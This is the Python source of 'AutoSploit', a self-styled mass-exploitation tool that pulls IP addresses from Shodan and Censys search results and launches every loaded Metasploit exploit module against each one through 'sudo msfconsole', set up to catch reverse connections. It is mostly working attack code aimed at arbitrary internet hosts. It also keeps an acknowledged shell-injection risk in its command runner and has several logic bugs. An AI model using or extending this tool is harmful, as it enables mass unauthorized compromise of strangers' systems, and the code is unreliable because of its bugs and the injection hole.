#!/usr/bin/env python2.7
"""
Autosploit Core, beta development version

TODO LIST:
 - Splitting the subprocess calls with shlex line #72 (done)
 - Add the ability to read in modules list as JSON, if .txt file is provided convert to JSON before processing (done)
 - Fix the exploit issue line #125
 - Fixing targets line #261
 - Fix clobber function line #281
 - Custom list importing line #317
 - Single target attacking line #366
 - Fix the non-existing host path reference line #409
 - Create a retry decorator with a max of 5 min of 3 line #436
 - Add a secondary check to make sure autosploit is running line #535
"""

import os
import sys
import time
import shlex
import pickle
import threading
import subprocess
import censysSearch
import shodan
# idk if you're going to need this since retrying is a decorator (see line 410)
# from retrying import retry

from lib.jsonize import load_exploits
from lib.cmdline.cmd import AutoSploitParser
from lib.settings import (
    validate_ip_addr,
    PLATFORM_PROMPT,
    AUTOSPLOIT_PROMPT
)
from lib.output import (
    info,
    prompt,
    error,
    warning
)


# Global vars
api = ""
query = ""
workspace = ""
local_port = ""
local_host = ""
configured = False
toolbar_width = 60
version = "1.4.0"
usage_and_legal_path = "{}/etc/general".format(os.getcwd())
loaded_exploits = load_exploits("{}/etc/json".format(os.getcwd()))
stop_animation = False
autosploit_opts = {
    1: "usage and legal", 2: "gather hosts", 3: "custom hosts",
    4: "add single host", 5: "view gathered hosts", 6: "exploit gathered hosts",
    99: "quit"
}


def logo(line_sep="#--", space=" " * 30):
    """Logo."""
    global version
    print("""\033[1m\033[36m{space_sep}_____     _       _____     _     _ _
{sep1}Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_
{sep1}Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
{sep1}Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|
{sep1}Version: {v_num}                                    |_|
##############################################\033[0m
""".format(sep1=line_sep, v_num=version, space_sep=space))


def animation(text):
    global stop_animation
    i = 0
    while not stop_animation:
        temp_text = list(text)
        if i >= len(temp_text):
            i = 0
        temp_text[i] = temp_text[i].upper()
        temp_text = ''.join(temp_text)
        sys.stdout.write("\033[96m\033[1m{}...\r\033[0m".format(temp_text))
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    else:
        pass


def usage():
    """Usage & Legal."""
    global usage_and_legal_path
    print("\033[H\033[J")  # Clear terminal
    logo()
    with open(usage_and_legal_path) as info:
        print(info.read())


def cmdline(command):
    """
    Function that allows us to store system command output in a variable.
    We'll change this later in order to solve the potential security
    risk that arises when passing untrusted input to the shell.

    I intend to have the issue resolved by Version 1.5.0.
    """

    command = shlex.split(command)

    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True
    )
    return process.communicate()[0]


def exploit(query=None, single=None):
    """Exploit component"""

    global workspace
    global local_port
    global local_host
    global loaded_exploits
    global stop_animation
    print("\033[H\033[J")  # Clear terminal

    logo()

    sorted_modules = []
    all_modules = []

    if query is None:
        rhosts = single

        info("[{}]Single target mode. All available modules will be run against provided RHOST.")
        proceed = prompt("Continue? [Y]es/[N]o")

        if proceed == 'y':
            thread = threading.Thread(
                target=animation, args=("loading modules", ))
            thread.daemon = True
            thread.start()

            for mod in loaded_exploits:
                all_modules.append(mod)

            stop_animation = True

            info("\n\n\nDone. Launching exploits.")
            for _exploit in loaded_exploits:
                template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                    workspace, local_host, local_port, rhosts, _exploit)
                cmdline(template)

        elif proceed == 'n':
            error("Aborted. Returning to Main Menu")

        else:
            warning("Unhandled Option. Defaulting to Main Menu")

    else:

        thread = threading.Thread(target=animation, args=(
            "sorting modules by relevance, this may take awhile",
        ))
        thread.daemon = True
        thread.start()

        for mod in loaded_exploits:
            all_modules.append(mod)

        stop_animation = True

    info("AutoSploit sorted the following MSF modules based search query relevance.")
    # Print out the sorted modules
    for i, line in enumerate(sorted_modules, start=1):
        print("[\033[36m{}\033[0m] {}".format(str(i), line.strip()))

    # We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
    # a more directed approach with the sorted modules.
    choice = prompt("Run sorted or all modules against targets? [S]orted/[A]ll")

    if choice == 's':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for _exploit in sorted_modules:
                    # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                        workspace, local_host, local_port, rhosts,_exploit)
                    cmdline(template)
    elif choice == 'a':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for _exploit in all_modules:
                    # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                        workspace, local_host, local_port, rhosts, _exploit)
                    cmdline(template)
    else:
        warning("Unhandled Option. Defaulting to Main Menu")


def settings(single=None):
    """Function to define Metasploit settings."""
    global workspace
    global local_port
    global local_host
    global configured

    print("\033[H\033[J")  # Clear terminal
    logo()

    info(
        "Metasploit Settings: In order to proceed with the"
        "exploit module some MSF settings need to be configured.\n"
        "Note.\nPlease make sure your Network is configured "
        "properly. In order to handle incoming Reverse Connections "
        "your external Facing IP & Port need to be reachable."
    )
    time.sleep(3)

    workspace = prompt("Please set the Workspace name", lowercase=False)
    if not workspace == "":
        info("Workspace set to: {}".format(workspace))
    else:
        workspace = False

    local_host = prompt("Please set the local host", lowercase=False)
    if not local_host == "":
        info("Local host set to: {}".format(repr(local_host)))
    else:
        local_host = False

    local_port = prompt("Please set the local port", lowercase=False)
    if not local_host == "":
        info("Local port set to: {}".format(repr(local_port)))
    else:
        local_port = False

    # Check if settings are not null
    if workspace is False or local_host is False or local_port is False:
        configured = None
        warning("Warning. LPORT, LHOST and/or workspace cannot be null")
        info("Restarting MSF Settings module.")
        time.sleep(2)
    else:
        # If everything has been properly configured we're setting config var to true
        # When we return to the main menu loop we will use it to check to see if we
        # can skip the config stage. When the exploit component is run a second time
        configured = True

        if single is not None:
            exploit(None, single)
            # TEST print
            print "value of 'single' is" + repr(single)
            # TEST print

        if not os.path.isfile("hosts.txt"):
            warning("Warning. AutoSploit failed to detect host file.")
            print("In order for the exploit module to work, a host file needs to be present.")
        else:
            # Call exploit function, the 'query' argument contains the search strig provided
            # in the 'gather hosts' function. We will check this string against the MSF
            # modules in order to sort out the most relevant ones with regards to the intended
            # targets.
            exploit(query)


def targets(clobber=True, hostLimit = -1):
    """Function to gather target host(s) from Shodan."""
    global query
    global stop_animation

    print("\033[H\033[J")  # Clear terminal
    logo()

    info("Please provide your platform specific search query.")
    info("I.E. 'IIS' will return a list of IPs belonging to IIS servers.")

    while True:
        query = raw_input(PLATFORM_PROMPT)
        if query == "":
            error("[{}]Query cannot be null.")
        else:
            break

    info("Please stand by while results are being collected...")
    time.sleep(1)

    try:
        result = api.search(query)
    except Exception as e:
        error("Critical. An error was raised with the following error message. '{}'".format(str(e)))
        sys.exit(1)

    thread = threading.Thread(target=animation, args=("collecting results", ))
    thread.daemon = True
    thread.start()

    # TODO:/
    # edit the clobber function to work properly
    if clobber:
        with open('hosts.txt', 'wb') as log:
            for _ in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    if hostLimit > 0 or hostLimit < 0:
                        log.write("{}{}".format(service['ip_str'], os.linesep))
                        hostLimit -= 1
                    else:
                        break
            hostpath = os.path.abspath("hosts.txt")
            stop_animation = True

        info("Done.")
        info("Host list saved to {}".format(hostpath))

    else:
        with open("hosts.txt", "ab") as log:
            for i in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("")

        hostpath = os.path.abspath("hosts.txt")
        stop_animation = True

    info("Done.")
    info("Hosts appended to list at {}".format(hostpath))


# TODO:/
# custom list importing needs to be done here.
# could be possible to import the custom list via argparse
def import_custom(clobber=True):
    """
    Function to import custom host list.
    """
    print("\033[H\033[J")  # Clear terminal
    logo()

    custom_list = []

    info("Please provide a path to your custom host list.")
    file_path = prompt("Path to list", lowercase=False)

    try:
        with open(file_path, "rb") as infile:
            for line in infile:
                custom_list.append(line.strip())

    except IOError as e:
        error(
            "An IOError was raised from provided path '{}' "
            "make sure the path is correct and try again".format(str(e.message))
        )

    if clobber:
        info("Writing data to 'hosts.txt'...")
        with open('hosts.txt', 'wb') as outfile:
            for rhosts in custom_list:
                outfile.write("{}{}".format(rhosts, os.linesep))

        hostpath = os.path.abspath("hosts.txt")

        info("[{}]Done.")
        info("Host list saved to {}".format(hostpath))

    else:
        info("Appending data to 'hosts.txt'...")

    with open("hosts.txt", 'ab') as outfile:
        for rhosts in outfile:
            outfile.write("{}{}".format(rhosts, os.linesep))

        hostpath = os.path.abspath("hosts.txt")

        info("[{}]Done.")
        info("Host list saved to {}".format(hostpath))


def single_target():
    # TODO:/
    # create the single target attacking, this will need a single target passed
    # to it in order to work properly, I'm assuming this for when you find
    # something you know is vulnerable and want to fuck it up not just a little.
    """
    Add single target to host list or pass it to the exploit function directly
    to attempt to exploit it.
    """
    print("\033[H\033[J")  # Clear terminal
    logo()

    info("Please provide a single IPv4.")
    IP = prompt("IPv4 Address", lowercase=False)

    if not validate_ip_addr(IP):
        error("Provided IP address was not able to validated, try again")

        info("Append the IP to the host file or pass to exploit module directly?.")
        choice = prompt("Append or Pass for immediate exploitation? [A/P]")

        if choice == 'a':
            with open("hosts.txt", "ab") as outfile:
                outfile.write(IP)

            hostpath = os.path.abspath("hosts.txt")
            info("Host set to {}".format(repr(hostpath)))
            time.sleep(1)

        elif choice == 'p':
            if configured:
                exploit(None, IP)
            else:
                settings(IP)

        else:
            warning("Unhandled Option.")


def main():
    """Main menu."""
    global query
    global configured
    global api
    global autosploit_opts

    # TODO:/
    # commenting this out for now, guessing we need to create a retry function
    # so that we don't have to add another requirement
    # @retry(stop_max_attempt_number=3)
    def try_shodan():
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            return api
        except Exception as e:
            error("Critical. API setup failed with error '{}'".format(e))
            # sys.exit(e)

    api = try_shodan()
    try:
        while True:
            # Make sure a misconfiguration in the MSF settings
            # Doesn't execute main menu loop but returns us to the
            # appropriate function for handling those settings

            if configured is None:
                settings()

            info("Welcome to AutoSploit. Please select an action.")
            for i in autosploit_opts.keys():
                print("{}. {}".format(i, autosploit_opts[i].title()))

            action = raw_input(AUTOSPLOIT_PROMPT)

            if action == '1':
                usage()
            elif action == '2':
                hostLimit = -1
                limitYN = prompt("Limit number of hosts? [y/n]")
                if limitYN == 'y':
                    hostLimit = prompt("How many?", lowercase=False)
                searchOption = raw_input(
                    "Select an option:\n1. Search Shodan\n2. Search Censys\n3. Search Shodan and Censys\n"
                )
                if searchOption == 1:
                    if not os.path.isfile("hosts.txt"):
                        targets(True, hostLimit)
                    else:
                        append = prompt("Append hosts to file or overwrite? [A/O]")
                        if append == 'a':
                            targets(False, hostLimit)
                        elif append == 'o':
                            targets(True, hostLimit)
                        else:
                            error("Unhandled Option.")
                elif searchOption == 2:
                    if not os.path.isfile("hosts.txt"):
                        censysSearch.censysTargets(True, hostLimit)
                    else:
                        append = prompt("Append hosts to file or overwrite? [A/O]")
                        if append == 'a':
                            censysSearch.censysTargets(False, hostLimit)
                        elif append == 'o':
                            censysSearch.censysTargets(True, hostLimit)
                        else:
                            warning("Unhandled Option.")
                elif searchOption == 3:
                    if not os.path.isfile("hosts.txt"):
                        targets(True, hostLimit)
                        censysSearch.censysTargets(False, hostLimit)
                    else:
                        append = prompt("Append hosts to file or overwrite? [A/O]")
                        if append == 'a':
                            targets(False, hostLimit)
                            censysSearch.censysTargets(False, hostLimit)
                        elif append == 'o':
                            targets(True, hostLimit)
                            censysSearch.censysTargets(False, hostLimit)
                        else:
                            warning("Unhandled Option.")


                else:
                    error("Unhandled Option.")

            elif action == '3':
                if not os.path.isfile("hosts.txt"):
                    import_custom(True)
                else:
                    append = prompt("Append hosts to file or overwrite? [A/O]")

                    if append == 'a':
                        import_custom(False)
                    elif append == 'o':
                        import_custom(True)
                    else:
                        warning("[{}]Unhandled Option.")
            elif action == '4':
                single_target()
            elif action == '5':
                if not os.path.isfile("hosts.txt"):
                    warning("Warning. AutoSploit failed to detect host file.")
                else:
                    info("Printing hosts...")
                    time.sleep(2)

                    with open("hosts.txt", "rb") as infile:
                        for line in infile:
                            print("[\033[36m-\033[0m]{}".format(line))

                        info("Done.")
            elif action == '6':
                if not os.path.isfile("hosts.txt"):
                    warning("Warning. AutoSploit failed to detect host file.")
                    print("Please make sure to gather a list of targets")
                    print("by selecting the 'Gather Hosts' option")
                    print("before executing the 'Exploit' module.")

            if configured:
                exploit(query)
            elif configured is False:
                settings()
            elif action == '99':
                error("Exiting AutoSploit...")
                return
            else:
                warning("Unhandled Option.")

    except KeyboardInterrupt:
        error("Critical. User aborted.")
        sys.exit(0)


if __name__ == "__main__":

    if len(sys.argv) > 1:
        opts = AutoSploitParser().optparser()
        AutoSploitParser().single_run_args(opts)

    logo()

    info("Initializing AutoSploit...")
    info("One moment please while we check the Postgresql and Apache services...")

    postgresql = cmdline("sudo service postgresql status | grep active")
    if "Active: inactive" in postgresql:
        warning("Warning. Heuristic tests have indicated PostgreSQL Service is offline")

        start_pst = prompt("Start Postgresql Service? [Y]es/[N]o")
        if start_pst == 'y':
            os.system("sudo service postgresql start")
            info("Postgresql Service Started...")
            time.sleep(1.5)

        elif start_pst == 'n':
            error("AutoSploit's MSF related operations require this service to be active.")
            error("Aborted.")
            time.sleep(1.5)
            sys.exit(0)
        else:
            warning("Unhandled Option. Defaulting to starting the service.")
            os.system("sudo service postgresql start")

            info("Postgresql Service Started...")
            time.sleep(1.5)

    apache = cmdline("service apache2 status | grep active")
    if "Active: inactive" in apache:
        warning("Warning. Heruistic tests indicated that Apache Service is offline")

        start_ap = prompt("Start Apache Service? [Y]es/[N]o")
        if start_ap == 'y':
            os.system("sudo service apache2 start")

            info("[{}]Apache2 Service Started...")
            time.sleep(1.5)

        elif start_ap == 'n':
            error("AutoSploit's MSF related operations require this service to be active.")
            error("Aborted.")
            time.sleep(1.5)
            sys.exit(0)
        else:
            warning("Unhandled Option. Defaulting to starting the service.")
            os.system("sudo service apache2 start")
            # TODO:/
            # Should really add another check here to make sure it started,
            # possible to use `psutils` to check the running tasks for autosploit

            info("Apache2 Service Started...")
            time.sleep(1.5)

    # We will check if the shodan api key has been saved before, if not we are going to prompt
    # for it and save it to a file
    if not os.path.isfile("api.p"):
        info("Please provide your Shodan.io API key.")

        SHODAN_API_KEY = prompt("API key", lowercase=False)
        pickle.dump(SHODAN_API_KEY.strip(), open("api.p", "wb"))
        path = os.path.abspath("api.p")
        info("Your API key has been saved to {}".format(path))
        main()

    else:
        try:
            SHODAN_API_KEY = pickle.load(open("api.p", "rb"))
        except IOError as e:
            error("Critical. An IO error was raised while attempting to read API data. '{}'".format(str(e)))

        path = os.path.abspath("api.p")
        info("Your API key was loaded from {}".format(path))

        main()
